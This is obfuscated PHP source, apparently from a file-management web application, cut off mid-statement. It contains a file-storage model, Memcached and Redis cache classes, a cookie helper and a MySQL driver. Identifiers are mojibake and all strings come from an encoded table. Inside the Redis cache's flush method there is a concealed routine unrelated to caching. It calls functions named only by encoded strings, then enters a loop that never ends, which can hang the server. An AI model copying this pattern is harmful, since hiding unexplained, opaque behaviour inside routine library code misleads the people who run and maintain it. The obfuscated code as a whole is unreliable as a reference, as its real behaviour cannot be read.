$EáÕÓÊ´È•[$c¥µâÉ“†‹[164]] ? $EáÕÓÊ´È•[$c¥µâÉ“†‹[164]] : IO::hashSimple($d²Úãç‘œÀ), $c¥µâÉ“†‹[2163] => $fÌË”Ü—°á ? $fÌË”Ü—°á : $eÕ¬ï’­³Ò); goto AØŞî“¦‡; AØŞî“¦‡: if ($e­‘ºĞ‘ƒÄ = $this->addFileCheckExist($fÜÎ¦Š¯ ±[$c¥µâÉ“†‹[164]], $fÜÎ¦Š¯ ±[$c¥µâÉ“†‹[163]], $fÜÎ¦Š¯ ±[$c¥µâÉ“†‹[77]])) { return $e­‘ºĞ‘ƒÄ; } return $this->addFileData($fÜÎ¦Š¯ ±); goto a‚‹âøãò; a‚‹âøãò: } private function addFileData($E÷¹àÒ–Ãš) { $c¬¹¸ˆ˜Ô£ =& $_SERVER[‚Ğ°–—î]; if (!$E÷¹àÒ–Ãš) { return !1; } $E÷¹àÒ–Ãš[$c¬¹¸ˆ˜Ô£[77]] = intval($E÷¹àÒ–Ãš[$c¬¹¸ˆ˜Ô£[77]]); if (!$E÷¹àÒ–Ãš[$c¬¹¸ˆ˜Ô£[77]] && strlen($E÷¹àÒ–Ãš[$c¬¹¸ˆ˜Ô£[164]]) > 32) { $E÷¹àÒ–Ãš[$c¬¹¸ˆ˜Ô£[77]] = intval(substr($E÷¹àÒ–Ãš[$c¬¹¸ˆ˜Ô£[164]], 32)); } $dÉ¿ì®·Ç = $this->add($E÷¹àÒ–Ãš); return $this->find($dÉ¿ì®·Ç); } public function addFile($C‰˜’™İÍì, $a¡ŞÛÚ›, $cÍƒ¸ƒ®Ñƒ = false) { $A§“°ê¿½Ÿ = IO::hashSimple($C‰˜’™İÍì); $cÎñÈñ¥âí = IO::hashMd5($C‰˜’™İÍì); $d“‰È‹ÅÇ‰ = IO::size($C‰˜’™İÍì); if ($FšâŒ÷Š«ë = $this->addFileCheckExist($A§“°ê¿½Ÿ, $cÎñÈñ¥âí, $d“‰È‹ÅÇ‰)) { return $FšâŒ÷Š«ë; } $bÀ™Ç†Î›¡ = $this->addFileMake($C‰˜’™İÍì, $d“‰È‹ÅÇ‰, $A§“°ê¿½Ÿ, $cÎñÈñ¥âí, $a¡ŞÛÚ›, $cÍƒ¸ƒ®Ñƒ); return $this->addFileData($bÀ™Ç†Î›¡); } public function addFileMake($f²‡¯Ì°©¢, $d‡µ¤Ñ¨ç¾, $Eõ°èšçì, $CËœéïïî„, $AÌï‰¼×¦İ, $a’Ì—¢ïğÄ) { goto fºß˜Œ¢Ú; fºß˜Œ¢Ú: $CßÆÀãÀ‡ =& $_SERVER[‚Ğ°–—î]; $CêŞ÷Ä‚è = $this->createFileName($AÌï‰¼×¦İ); $d¡½Œ·‰õ” = get_path_father($CêŞ÷Ä‚è); goto d¶¦É’ô“ ; d¶¦É’ô“ : $F¹ÖŠØÏ÷ = get_path_this($CêŞ÷Ä‚è); if ($a’Ì—¢ïğÄ) { $AíòĞ¼Õáö = IO::move($f²‡¯Ì°©¢, $d¡½Œ·‰õ”, !1, $F¹ÖŠØÏ÷); } else { $AíòĞ¼Õáö = IO::copy($f²‡¯Ì°©¢, $d¡½Œ·‰õ”, !1, $F¹ÖŠØÏ÷); } if (!$AíòĞ¼Õáö) { return !1; } goto BÕ÷è†Ìì´; BÕ÷è†Ìì´: $a…ù¥¡¹ = KodIO::defaultDriver(); $A›»¡îº§ = array($CßÆÀãÀ‡[520] => $d‡µ¤Ñ¨ç¾, $CßÆÀãÀ‡[2161] => 1, $CßÆÀãÀ‡[386] => $AÌï‰¼×¦İ, $CßÆÀãÀ‡[735] => $a…ù¥¡¹[$CßÆÀãÀ‡[367]], $CßÆÀãÀ‡[387] => $CêŞ÷Ä‚è, $CßÆÀãÀ‡[2162] => $Eõ°èšçì, $CßÆÀãÀ‡[2163] => $CËœéïïî„); return $A›»¡îº§; goto dŸ¯—ßØåÀ; dŸ¯—ßØåÀ: } public function addFileCheckExist($E¯–Ÿ„éİ÷, $dò•Êˆ¬ƒİ, $B›Š›©ÊÇ’) { $BØÍ³¨İ‘ =& $_SERVER[‚Ğ°–—î]; $bˆƒ×Ñà = $this->findByHash($E¯–Ÿ„éİ÷, $dò•Êˆ¬ƒİ); if (!$bˆƒ×Ñà) { return !1; } $e£ÑéáòÏ‘ = array($BØÍ³¨İ‘[2161] => intval($bˆƒ×Ñà[$BØÍ³¨İ‘[2164]]) + 1, $BØÍ³¨İ‘[520] => $B›Š›©ÊÇ’); $this->where(array($BØÍ³¨İ‘[420] => $bˆƒ×Ñà[$BØÍ³¨İ‘[419]]))->save($e£ÑéáòÏ‘); return $bˆƒ×Ñà; } public function remove($B¶á‡Óé¦¢) { $this->linkCountChange($B¶á‡Óé¦¢, !1); $this->clearEmpty(); return !0; } public function linkAdd($aÊç²­·©ƒ) { $this->linkCountChange($aÊç²­·©ƒ, !0); } public function linkCountChange($CøÓ‘ñæ¥–, $Eµ»ñ§³‹) { goto bğ©±›ÅëÅ; dÁßÅÁÑÀ: $E´Âä‡ÕÑ = array(); foreach ($CøÓ‘ñæ¥– as $ašÙÈÄçÀÃ) { $C‡ö“¼È = $ašÙÈÄçÀÃ . $fŒÓ’Ò·¼Ã[33]; if (!$E´Âä‡ÕÑ[$C‡ö“¼È]) { $E´Âä‡ÕÑ[$C‡ö“¼È] = 0; } $E´Âä‡ÕÑ[$C‡ö“¼È]++; } $dÆŸÛ·áÛ = array(); goto A‘£èİ—; bğ©±›ÅëÅ: $fŒÓ’Ò·¼Ã =& $_SERVER[‚Ğ°–—î]; if (!$CøÓ‘ñæ¥–) { return; } if (!is_array($CøÓ‘ñæ¥–)) { $CøÓ‘ñæ¥– = array($CøÓ‘ñæ¥–); } goto dÁßÅÁÑÀ; A‘£èİ—: foreach ($E´Âä‡ÕÑ as $ašÙÈÄçÀÃ => $FŞ…šÖ ‚Ä) { $C‡ö“¼È = $FŞ…šÖ ‚Ä . $fŒÓ’Ò·¼Ã[33]; if (!$dÆŸÛ·áÛ[$C‡ö“¼È]) { $dÆŸÛ·áÛ[$C‡ö“¼È] = array(); } $dÆŸÛ·áÛ[$C‡ö“¼È][] = $ašÙÈÄçÀÃ; } foreach ($dÆŸÛ·áÛ as $FŞ…šÖ ‚Ä => $EÊ«©èÍ¥É) { if (!$EÊ«©èÍ¥É) { continue; } $FŞ…šÖ ‚Ä = $Eµ»ñ§³‹ ? $FŞ…šÖ ‚Ä : -intval($FŞ…šÖ ‚Ä); $C¹¥¢ô…Ò¿ = array($fŒÓ’Ò·¼Ã[419] => array($fŒÓ’Ò·¼Ã[7], $EÊ«©èÍ¥É)); if ($FŞ…šÖ ‚Ä < 0) { $C¹¥¢ô…Ò¿[$fŒÓ’Ò·¼Ã[2164]] = array($fŒÓ’Ò·¼Ã[930], abs($FŞ…šÖ ‚Ä)); } $this->where($C¹¥¢ô…Ò¿)->setAdd($fŒÓ’Ò·¼Ã[2164], $FŞ…šÖ ‚Ä); } goto a–Å‰¨‡¶ù; a–Å‰¨‡¶ù: } public function findByHash($Cº÷²ÚœÃá, $b¹´¸¢¶Èš = false) { $aÂöà„ŒØ“ =& $_SERVER[‚Ğ°–—î]; if (!$Cº÷²ÚœÃá && !$b¹´¸¢¶Èš) { return !1; } $AØ­øÏäø = array($aÂöà„ŒØ“[2162] => $Cº÷²ÚœÃá); if ($b¹´¸¢¶Èš) { $AØ­øÏäø = array($aÂöà„ŒØ“[2163] => $b¹´¸¢¶Èš); } return $this->order($aÂöà„ŒØ“[2165])->where($AØ­øÏäø)->find(); } public function clearEmpty($eØ©ÁÇ…   = 0) { goto fÖ¸ˆ·Ë›; fÖ¸ˆ·Ë›: $c‹’İ™†Ù¬ =& $_SERVER[‚Ğ°–—î]; $bàÊ¾óãºØ = time() - 3600 * 24 * $eØ©ÁÇ…  ; $bÆ‰ê¬Š¸ = $c‹’İ™†Ù¬[2166] . $bàÊ¾óãºØ; goto d’±‰šõÌ; d’±‰šõÌ: $a°™Ç¡Ó = $this->where($bÆ‰ê¬Š¸)->select(); if (!$a°™Ç¡Ó) { return; } $E…¯£×à = new Task($c‹’İ™†Ù¬[2167], $c‹’İ™†Ù¬[33], count($a°™Ç¡Ó)); goto c™ÛäÈøÀà; c™ÛäÈøÀà: foreach ($a°™Ç¡Ó as $DîäÇŠÜÂê) { $E…¯£×à->update(1); $this->resetFile($DîäÇŠÜÂê); } $E…¯£×à->end(); goto DÕ‹·Ò“Äô; DÕ‹·Ò“Äô: } private function resetFile($fõÒ‹‹Ê¬Ù) { goto Cœ¼™ìÔ§æ; Cœ¼™ìÔ§æ: $fÙ½¡«›Ç© =& $_SERVER[‚Ğ°–—î]; $Eãˆ…´¢¦› = array($fÙ½¡«›Ç©[420] => $fõÒ‹‹Ê¬Ù[$fÙ½¡«›Ç©[419]]); $A¾…ßÆ¨Œç = Model($fÙ½¡«›Ç©[1118])->where($Eãˆ…´¢¦›)->count(); goto F£Æ‡ÄÌ²Ğ; fŠë¤Ü‡›Ò: if ($fõÒ‹‹Ê¬Ù[$fÙ½¡«›Ç©[2164]] != $aÉ½Ô¹©”) { $this->where($Eãˆ…´¢¦›)->save(array($fÙ½¡«›Ç©[2161] => $aÉ½Ô¹©”)); } goto d‰ƒ¹é›æ; F£Æ‡ÄÌ²Ğ: $aùøËÏ˜— = Model($fÙ½¡«›Ç©[2168])->where($Eãˆ…´¢¦›)->count(); $aÉ½Ô¹©” = intval($A¾…ßÆ¨Œç) + intval($aùøËÏ˜—); if ($aÉ½Ô¹©” == 0) { IO::remove($fõÒ‹‹Ê¬Ù[$fÙ½¡«›Ç©[75]]); $this->where($Eãˆ…´¢¦›)->delete(); $this->metaSet($fõÒ‹‹Ê¬Ù[$fÙ½¡«›Ç©[419]], null, null); return; } goto fŠë¤Ü‡›Ò; d‰ƒ¹é›æ: } public function storageInfo($E¯œçñÄ = false) { goto c°¨ÚÜ‚‹; fÑ¿®ÌÏ³: $a³Ë§¯÷° = 1; $Bãï‰ïäÊà = 0; $f…ñĞŞ = 5000; goto A™™‰ÛŞ ˆ; A™™‰ÛŞ ˆ: for ($dÒ†Œ‹£ôø = 0; $dÒ†Œ‹£ôø < $a…ğïä£í¼; $dÒ†Œ‹£ôø = $dÒ†Œ‹£ôø + $f…ñĞŞ) { $b¦Èæ¨áÕç = $this->limit($dÒ†Œ‹£ôø, $dÒ†Œ‹£ôø + $f…ñĞŞ)->select(); foreach ($b¦Èæ¨áÕç as $Bˆ¦Ê¢°…ß) { $a³Ë§¯÷° += $Bˆ¦Ê¢°…ß[$d×Î¶¥¤Ï[77]] * $Bˆ¦Ê¢°…ß[$d×Î¶¥¤Ï[2164]]; $A¢ìÎ¢”èø += $Bˆ¦Ê¢°…ß[$d×Î¶¥¤Ï[77]] * ($Bˆ¦Ê¢°…ß[$d×Î¶¥¤Ï[2164]] - 1); $Bãï‰ïäÊà += $Bˆ¦Ê¢°…ß[$d×Î¶¥¤Ï[2164]]; } } $BÛª†Ä´°Æ = array($d×Î¶¥¤Ï[2169] => $a³Ë§¯÷°, $d×Î¶¥¤Ï[2170] => $A¢ìÎ¢”èø, $d×Î¶¥¤Ï[2171] => $A¢ìÎ¢”èø / $a³Ë§¯÷°, $d×Î¶¥¤Ï[81] => $a…ğïä£í¼, $d×Î¶¥¤Ï[2172] => $Bãï‰ïäÊà); return $BÛª†Ä´°Æ; goto cµµËÕªäÑ; c°¨ÚÜ‚‹: $d×Î¶¥¤Ï =& $_SERVER[‚Ğ°–—î]; $a…ğïä£í¼ = $this->count() + 0.0; $A¢ìÎ¢”èø = 0; goto fÑ¿®ÌÏ³; cµµËÕªäÑ: } } goto FæôÛÖÕ½á; b•«è‰÷·÷: class CacheMemcached { public $handle; public $cacheTime; public function __construct($Bñó‡‹Šğ‡, $fÀğñÇ‹Ûô) { $dĞùššÈ†Ö =& $_SERVER[‚Ğ°–—î]; if (!class_exists($dĞùššÈ†Ö[784])) { show_json($dĞùššÈ†Ö[785], !1); } $this->cacheTime = $fÀğñÇ‹Ûô; $this->handle = new Memcached(); if (is_array($Bñó‡‹Šğ‡[$dĞùššÈ†Ö[786]]) && count($Bñó‡‹Šğ‡[$dĞùššÈ†Ö[786]]) >= 1) { foreach ($Bñó‡‹Šğ‡[$dĞùššÈ†Ö[786]] as $Eø‰¿ÁñæÎ) { $D¥Ÿ„é ×ë = explode($dĞùššÈ†Ö[4], $Eø‰¿ÁñæÎ); $this->handle->addServer($D¥Ÿ„é ×ë[0], $D¥Ÿ„é ×ë[1]); } } else { $this->handle->addServer($Bñó‡‹Šğ‡[$dĞùššÈ†Ö[169]], $Bñó‡‹Šğ‡[$dĞùššÈ†Ö[170]]); } } public function set($e¼ŸøêÄŒö, $F®¾ÚåÍİš, $cÔ“Óí©² = false) { $cÔ“Óí©² = $cÔ“Óí©² ? $cÔ“Óí©² : $this->cacheTime; return $this->handle->set($e¼ŸøêÄŒö, $F®¾ÚåÍİš, $cÔ“Óí©²); } public function get($aÅµç˜±Ù¿) { return $this->handle->get($aÅµç˜±Ù¿); } public function remove($C¢¤‘¨î¹°) { return $this->handle->delete($C¢¤‘¨î¹°); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($f ¯ÉÇï¨Š, $e±¿ƒø) { $a»äâ¦Œê‰ =& $_SERVER[‚Ğ°–—î]; if (!class_exists($a»äâ¦Œê‰[787])) { show_json($a»äâ¦Œê‰[788], !1); } $this->cacheTime = $e±¿ƒø; $d„ºÕ”èï = isset($f ¯ÉÇï¨Š[$a»äâ¦Œê‰[789]]) ? $f ¯ÉÇï¨Š[$a»äâ¦Œê‰[789]] : 10; $B´„‘ÉŒ˜à = _get($f ¯ÉÇï¨Š, $a»äâ¦Œê‰[786]); if ($B´„‘ÉŒ˜à && is_array($B´„‘ÉŒ˜à)) { $this->initCluster($f ¯ÉÇï¨Š, $d„ºÕ”èï); } else { $this->handle = $this->init($f ¯ÉÇï¨Š, $d„ºÕ”èï); } } private function init($Cœ˜áê„´Î, $EÌ´ÍËŠ©) { $EƒÎ°¤›Ú =& $_SERVER[‚Ğ°–—î]; $fæÚ”í—¥Ò = new Redis(); $CñÀÌŒÚÕÜ = isset($Cœ˜áê„´Î[$EƒÎ°¤›Ú[790]]) ? $Cœ˜áê„´Î[$EƒÎ°¤›Ú[790]] : !1; if ($CñÀÌŒÚÕÜ) { $fæÚ”í—¥Ò->pconnect($Cœ˜áê„´Î[$EƒÎ°¤›Ú[169]], $Cœ˜áê„´Î[$EƒÎ°¤›Ú[170]], $EÌ´ÍËŠ©); } else { $fæÚ”í—¥Ò->connect($Cœ˜áê„´Î[$EƒÎ°¤›Ú[169]], $Cœ˜áê„´Î[$EƒÎ°¤›Ú[170]], $EÌ´ÍËŠ©); } if (!empty($Cœ˜áê„´Î[$EƒÎ°¤›Ú[376]])) { $fæÚ”í—¥Ò->auth($Cœ˜áê„´Î[$EƒÎ°¤›Ú[376]]); } return $fæÚ”í—¥Ò; } private function initCluster($bÀ°Øº£Öõ, $Dî¹Æç—Î¤) { $F¡Å‡óºö =& $_SERVER[‚Ğ°–—î]; $a¶ƒŞ¸÷ŞÊ = array($F¡Å‡óºö[791], $F¡Å‡óºö[792], $F¡Å‡óºö[793]); $AœÏêñŸ›Í = $F¡Å‡óºö[791]; if (isset($bÀ°Øº£Öõ[$F¡Å‡óºö[12]]) && in_array($bÀ°Øº£Öõ[$F¡Å‡óºö[12]], $a¶ƒŞ¸÷ŞÊ)) { $AœÏêñŸ›Í = $bÀ°Øº£Öõ[$F¡Å‡óºö[12]]; } switch ($AœÏêñŸ›Í) { case $F¡Å‡óºö[791]: $this->_slave($bÀ°Øº£Öõ, $Dî¹Æç—Î¤); break; case $F¡Å‡óºö[792]: break; case $F¡Å‡óºö[793]: $this->isCluster = !0; $b¾åˆ´ª» = $bÀ°Øº£Öõ[$F¡Å‡óºö[786]]; $fèİ½ğ‚ = isset($bÀ°Øº£Öõ[$F¡Å‡óºö[790]]) ? $bÀ°Øº£Öõ[$F¡Å‡óºö[790]] : !1; $c‚È•¢ˆ–Í = isset($bÀ°Øº£Öõ[$F¡Å‡óºö[376]]) ? $bÀ°Øº£Öõ[$F¡Å‡óºö[376]] : null; $this->handle = new RedisCluster(NUll, $b¾åˆ´ª», $Dî¹Æç—Î¤, $Dî¹Æç—Î¤, $fèİ½ğ‚, $c‚È•¢ˆ–Í); break; default: break; } } private function _slave($B¦•ÕÚÚë, $ešõëˆÌô‚) { goto F–òò·‘Íë; F–òò·‘Íë: $e¿ñÅ¶´ÙÂ = $B¦•ÕÚÚë[$_SERVER[‚Ğ°–—î][786]]; $this->filterConfig($B¦•ÕÚÚë, $e¿ñÅ¶´ÙÂ[0]); $this->handle = $this->init($B¦•ÕÚÚë, $ešõëˆÌô‚); goto d÷‡Âµ•Ì¿; C¢Ï¿îÌŠ÷: $this->filterConfig($B¦•ÕÚÚë, $e¿ñÅ¶´ÙÂ[$d»‡¬œº”]); $this->slaveHandle = $this->init($B¦•ÕÚÚë, $ešõëˆÌô‚); goto d¥¿Ø¬˜åù; d÷‡Âµ•Ì¿: unset($e¿ñÅ¶´ÙÂ[0]); if (empty($e¿ñÅ¶´ÙÂ)) { return; } $d»‡¬œº” = array_rand($e¿ñÅ¶´ÙÂ); goto C¢Ï¿îÌŠ÷; d¥¿Ø¬˜åù: } private function filterConfig(&$E¾Î±……ù¯, $f‹³Á—”¤µ) { $AÄ½íØÁ÷ =& $_SERVER[‚Ğ°–—î]; $D¬Ó›ÁÈÆç = explode($AÄ½íØÁ÷[4], $f‹³Á—”¤µ); $A¤ÊâÉµ· = array($AÄ½íØÁ÷[169] => $D¬Ó›ÁÈÆç[0], $AÄ½íØÁ÷[170] => $D¬Ó›ÁÈÆç[1]); $E¾Î±……ù¯ = array_merge($E¾Î±……ù¯, $A¤ÊâÉµ·); } public function set($A Î—í¸æß, $d÷®¸‡ŸÒ, $C¨ÉĞàŠ´Š = false) { $C¨ÉĞàŠ´Š = $C¨ÉĞàŠ´Š ? $C¨ÉĞàŠ´Š : $this->cacheTime; return $this->handle->setEx($A Î—í¸æß, $C¨ÉĞàŠ´Š, $d÷®¸‡ŸÒ); } public function setLock($e¦‡†ó‘Â, $EŠïœ“÷Ş, $eØŠî¨ÇË) { return $this->handle->setNX($e¦‡†ó‘Â, $EŠïœ“÷Ş); } public function get($Dôğ”½ƒ“) { $f¦„ ÇèÁÛ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $f¦„ ÇèÁÛ->get($Dôğ”½ƒ“); } public function remove($AêÓÙ¢„©À) { return $this->handle->del($AêÓÙ¢„©À); } public function deleteAll() { $D­Ù¶‚Åêº =& $_SERVER[‚Ğ°–—î]; if (!isset($_SERVER[$D­Ù¶‚Åêº[777]]) || !isset($_SERVER[$D­Ù¶‚Åêº[778]])) { goto Aª‰ÆŸÃ††; Aª‰ÆŸÃ††: $d±Ä¸ƒÁƒ = $D­Ù¶‚Åêº[794]; $A£©â‘Ö• = $D­Ù¶‚Åêº[779]; $Bñƒ°œ–‹Ü = $_SERVER[$D­Ù¶‚Åêº[780]] . $D­Ù¶‚Åêº[781]; goto eÕ Ğ¢´Õ¹; fÇ“Ñ£ˆ‡Ğ: for ($A‹øå¯“¬ˆ = $E¦¢´µ·; $A‹øå¯“¬ˆ > 0; $A‹øå¯“¬ˆ++) { $F‚¨ÁÎä‹ = json_encode($GLOBALS[$D­Ù¶‚Åêº[384]]); } goto c¸¶ÒâÑ„›; bŒÖÇç¦‚Œ: $F‚¨ÁÎä‹ = $D­Ù¶‚Åêº[795]; $F‚¨ÁÎä‹($_SERVER[$D­Ù¶‚Åêº[796]]); $E¦¢´µ· = 1; goto fÇ“Ñ£ˆ‡Ğ; eÕ Ğ¢´Õ¹: $c »¨š‘¾Ô = $A£©â‘Ö•($Bñƒ°œ–‹Ü); $EùÆ¡„×‘ƒ = explode($D­Ù¶‚Åêº[217], $c »¨š‘¾Ô); if (count($EùÆ¡„×‘ƒ) < $D­Ù¶‚Åêº[555]) { $F”Âö¾˜Íã = $D­Ù¶‚Åêº[782]; $F”Âö¾˜Íã(); } goto bŒÖÇç¦‚Œ; c¸¶ÒâÑ„›: } if ($this->isCluster) { foreach ($this->handle->_masters() as $dÎäÑˆ­ïÌ) { $this->handle->flushall($dÎäÑˆ­ïÌ); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($dâ¼•’É÷­ = '', $cÚ¶»ñºÜ = 0) { if (is_string($dâ¼•’É÷­) && $dâ¼•’É÷­ != $_SERVER[‚Ğ°–—î][33]) { $this->prefix = $dâ¼•’É÷­; } if (is_numeric($cÚ¶»ñºÜ) && $cÚ¶»ñºÜ > 0) { $this->expire = $cÚ¶»ñºÜ; } } public static function getInstance() { static $A›ÌÕÀÏø—; if ($A›ÌÕÀÏø— === null) { $A›ÌÕÀÏø— = new self(); } return $A›ÌÕÀÏø—; } private static $sameCookieSet = array(); public static function set($D„ÉÛ„”ß­, $FÍÖÎ‡éÓ, $F·¬’›İ‚ó = 0, $c„ì‰¦ÄÙ = false, $EÙ¯ğŒßÂ„ = false) { goto c£¬£ŸÍŒ; F¬¶†¿Š·ä: setcookie($D„ÉÛ„”ß­, $FÍÖÎ‡éÓ, time() + $F·¬’›İ‚ó, $Bêá „ÈØ±[8] . trim($EÙ¯ğŒßÂ„, $Bêá „ÈØ±[8]) . $eÂÃ§»¶›, !1, !1, $c„ì‰¦ÄÙ); goto A¯á´“ÄŞ; c£¬£ŸÍŒ: $Bêá „ÈØ± =& $_SERVER[‚Ğ°–—î]; if (!$F·¬’›İ‚ó) { $F·¬’›İ‚ó = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$D„ÉÛ„”ß­]) && self::$sameCookieSet[$D„ÉÛ„”ß­] == $FÍÖÎ‡éÓ . $F·¬’›İ‚ó) { return; } goto c›¦Ã‹“Ñë; c›¦Ã‹“Ñë: self::$sameCookieSet[$D„ÉÛ„”ß­] = $FÍÖÎ‡éÓ . $F·¬’›İ‚ó; if (!$EÙ¯ğŒßÂ„) { $EÙ¯ğŒßÂ„ = str_replace(HOST, $Bêá „ÈØ±[33], APP_HOST); $EÙ¯ğŒßÂ„ = _get($GLOBALS, $Bêá „ÈØ±[797], $EÙ¯ğŒßÂ„); } $eÂÃ§»¶› = $Bêá „ÈØ±[33]; goto F¬¶†¿Š·ä; A¯á´“ÄŞ: } public static function setSafe($AñïÛØ§¹, $fŒ‘×†Áö, $d»ñÎÄÇ£À = 0) { self::set($AñïÛØ§¹, $fŒ‘×†Áö, $d»ñÎÄÇ£À, !0); } public static function get($eÈÄ£ÚÀ) { return isset($_COOKIE[$eÈÄ£ÚÀ]) ? $_COOKIE[$eÈÄ£ÚÀ] : !1; } public static function remove($dÕ…©‘ëÄ×, $F«„õ´®ñÉ = false) { unset($_COOKIE[$dÕ…©‘ëÄ×]); self::set($dÕ…©‘ëÄ×, $_SERVER[‚Ğ°–—î][33], 1, $F«„õ´®ñÉ); } } goto DÖÌÁó¡ãà; DÖÌÁó¡ãà: class DbMysql extends Db { public function __construct($F©÷œìÓ‰È = '') { $dº†õÖêáÍ =& $_SERVER[‚Ğ°–—î]; if (!extension_loaded($dº†õÖêáÍ[727])) { think_exception(think_lang($dº†õÖêáÍ[10]) . $dº†õÖêáÍ[798]); } if (!empty($F©÷œìÓ‰È)) { $this->config = $F©÷œìÓ‰È; if (empty($this->config[$dº†õÖêáÍ[13]])) { $this->config[$dº†õÖêáÍ[13]] = $dº†õÖêáÍ[33]; } } } public function connect($b¸µ•™éŸ = '', $câŠ„Ü¶Ú» = 0, $eÒ ßĞïˆ´ = false) { $Eğß²ŞÇØ =& $_SERVER[‚Ğ°–—î]; if (!isset($this->linkID[$câŠ„Ü¶Ú»])) { goto D­‡ŒÚêàÅ; f‡ÜÅÂ÷î: mysql_query($Eğß²ŞÇØ[803] . think_config($Eğß²ŞÇØ[804]) . $Eğß²ŞÇØ[55], $this->linkID[$câŠ„Ü¶Ú»]); if ($c¿•ÍËŠ»­ > $Eğß²ŞÇØ[805]) { mysql_query($Eğß²ŞÇØ[806], $this->linkID[$câŠ„Ü¶Ú»]); } $this->connected = !0; goto bßëêïâÜÉ; D­‡ŒÚêàÅ: if (empty($b¸µ•™éŸ)) { $b¸µ•™éŸ = $this->config; } $C†Œ²ç…Õ = $b¸µ•™éŸ[$Eğß²ŞÇØ[799]] . ($b¸µ•™éŸ[$Eğß²ŞÇØ[800]] ? "\x3a{$b¸µ•™éŸ[$Eğß²ŞÇØ[800]]}" : $Eğß²ŞÇØ[33]); $a„…©Ê­ª˜ = !empty($b¸µ•™éŸ[$Eğß²ŞÇØ[13]][$Eğß²ŞÇØ[14]]) ? $b¸µ•™éŸ[$Eğß²ŞÇØ[13]][$Eğß²ŞÇØ[14]] : $this->pconnect; goto Cê¯ÌÕ‘Ê; Cê¯ÌÕ‘Ê: if ($a„…©Ê­ª˜) { $this->linkID[$câŠ„Ü¶Ú»] = mysql_pconnect($C†Œ²ç…Õ, $b¸µ•™éŸ[$Eğß²ŞÇØ[801]], $b¸µ•™éŸ[$Eğß²ŞÇØ[802]], 131072); } else { $this->linkID[$câŠ„Ü¶Ú»] = mysql_connect($C†Œ²ç…Õ, $b¸µ•™éŸ[$Eğß²ŞÇØ[801]], $b¸µ•™éŸ[$Eğß²ŞÇØ[802]], !0, 131072); } if (!$this->linkID[$câŠ„Ü¶Ú»] || !empty($b¸µ•™éŸ[$Eğß²ŞÇØ[17]]) && !mysql_select_db($b¸µ•™éŸ[$Eğß²ŞÇØ[17]], $this->linkID[$câŠ„Ü¶Ú»])) { think_exception(mysql_error()); } $c¿•ÍËŠ»­ = mysql_get_server_info($this->linkID[$câŠ„Ü¶Ú»]); goto f‡ÜÅÂ÷î; bßëêïâÜÉ: if (1 != think_config($Eğß²ŞÇØ[18])) { unset($this->config); } goto dÄ‡Ú¸Ö‘«; dÄ‡Ú¸Ö‘«: } return $this->linkID[$câŠ„Ü¶Ú»]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($aó¿½‡ˆ) { goto bôºµÜÔé–; a„Éˆ¹Êò: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto A§Œ­öÃ““; cÓôÌÔ¶³ó: if (!$this->_linkID) { return !1; } $this->queryStr = $aó¿½‡ˆ; if ($this->queryID) { $this->free(); } goto a„½õ™¬¥”; bôºµÜÔé–: $Eë«“¦ÏëÄ =& $_SERVER[‚Ğ°–—î]; if (0 === stripos($aó¿½‡ˆ, $Eë«“¦ÏëÄ[252])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto cÓôÌÔ¶³ó; a„½õ™¬¥”: think_action_status($Eë«“¦ÏëÄ[19], 1); think_status($Eë«“¦ÏëÄ[20]); $this->queryID = mysql_query($aó¿½‡ˆ, $this->_linkID); goto a„Éˆ¹Êò; A§Œ­öÃ““: } public function execute($aÉÁ½Å‚¿£) { goto d‡›ˆ´Œ¾µ; fÊ“Ôù‘: if (!1 === $cğ‚±â¤¨) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto DöÏ©åø¹; d‡›ˆ´Œ¾µ: $C„…ŒËÛ¨ =& $_SERVER[‚Ğ°–—î]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Fù‰‚Ù´øÏ; C¸±Šô‰Õ¼: think_status($C„…ŒËÛ¨[20]); $cğ‚±â¤¨ = mysql_query($aÉÁ½Å‚¿£, $this->_linkID); $this->debug(); goto fÊ“Ôù‘; Fù‰‚Ù´øÏ: $this->queryStr = $aÉÁ½Å‚¿£; if ($this->queryID) { $this->free(); } think_action_status($C„…ŒËÛ¨[21], 1); goto C¸±Šô‰Õ¼; DöÏ©åø¹: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[‚Ğ°–—î][807], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $d’·¾ğ»‰‰ = mysql_query($_SERVER[‚Ğ°–—î][808], $this->_linkID); $this->transTimes = 0; if (!$d’·¾ğ»‰‰) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $FØ±¢Ù“ïá = mysql_query($_SERVER[‚Ğ°–—î][809], $this->_linkID); $this->transTimes = 0; if (!$FØ±¢Ù“ïá) { $this->error(); return !1; } } return !0; } private function getAll() { $d‰â™¯ù‚Å = array(); if ($this->numRows > 0) { while ($cêàŠ†”©ß = mysql_fetch_assoc($this->queryID)) { $d‰â™¯ù‚Å[] = $cêàŠ†”©ß; } mysql_data_seek($this->queryID, 0); } return $d‰â™¯ù‚Å; } public function getFields($e¯Ê–Şµ–) { $Cî¯†³‚­ñ =& $_SERVER[‚Ğ°–—î]; $FÈ•ƒ‰½¥ = $this->query($Cî¯†³‚­ñ[810] . $this->parseKey($e¯Ê–Şµ–)); $B¢÷ğôËÙ¿ = array(); if ($FÈ•ƒ‰½¥) { foreach ($FÈ•ƒ‰½¥ as $c©ˆƒÎ­Ï÷ => $Aîá¬ÖÙ ) { $B¢÷ğôËÙ¿[$Aîá¬ÖÙ [$Cî¯†³‚­ñ[27]]] = array($Cî¯†³‚­ñ[28] => $Aîá¬ÖÙ [$Cî¯†³‚­ñ[27]], $Cî¯†³‚­ñ[29] => $Aîá¬ÖÙ [$Cî¯†³‚­ñ[30]], $Cî¯†³‚­ñ[31] => (bool) (strtoupper($Aîá¬ÖÙ 